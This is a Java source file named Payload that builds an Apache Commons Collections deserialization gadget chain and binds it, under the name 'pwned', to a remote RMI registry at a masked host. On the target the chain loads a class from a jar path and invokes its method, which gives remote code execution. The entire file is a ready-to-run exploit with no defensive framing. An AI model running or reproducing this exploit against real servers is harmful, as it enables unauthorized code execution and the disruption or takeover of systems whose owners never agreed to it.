package com.ledo.sdxl;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.MalformedURLException;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

/**
 * @author caijiahe
 */
public class Payload {
	
	private static final String HOST_NAME = "xxx.xxx.xxx.xxx";
	private static final int PORT = 29023;
	
	private static final String JAR_FILE_URL = "file:/root/server/gs/example.jar";
	private static final String CLASS_NAME = "knight.Stop";
	private static final String METHOD_NAME = "stop";

	@SuppressWarnings("unchecked")
	private static Object getPayloadObject(Transformer transformerChain) throws Exception {
		Map<String, String> innerMap = new HashMap<String, String>();
		innerMap.put("value", "value");
		Map<String, String> outmap = TransformedMap.decorate(innerMap, null, transformerChain);

		Class<?> cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> ctor = cls.getDeclaredConstructor(Class.class, Map.class);
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(new Object[] { Target.class, outmap });
		return instance;
	}

	private static Transformer getURLClassLoaderTransformer() throws MalformedURLException {
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(
						java.net.URLClassLoader.class),
				new InvokerTransformer("getConstructor", new Class[] { Class[].class },
						new Object[] { new Class[] { java.net.URL[].class } }),
				new InvokerTransformer("newInstance", new Class[] { Object[].class },
						new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(JAR_FILE_URL) } } }),
				new InvokerTransformer("loadClass", new Class[] { String.class }, new Object[] {  CLASS_NAME }),
				new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class },
						new Object[] { METHOD_NAME, new Class[] {} }),
				new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class },
						new Object[] { null, new Object[] {} }) };
		Transformer transformedChain = new ChainedTransformer(transformers);
		return transformedChain;
	}

	public static void main(String[] args) throws Exception {
		try {
			Object instance = getPayloadObject(getURLClassLoaderTransformer());
	
			Registry registry = LocateRegistry.getRegistry(HOST_NAME, PORT);
			InvocationHandler h = (InvocationHandler) instance;
			Remote r = Remote.class
					.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, h));
			registry.bind("pwned", r);
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}

}
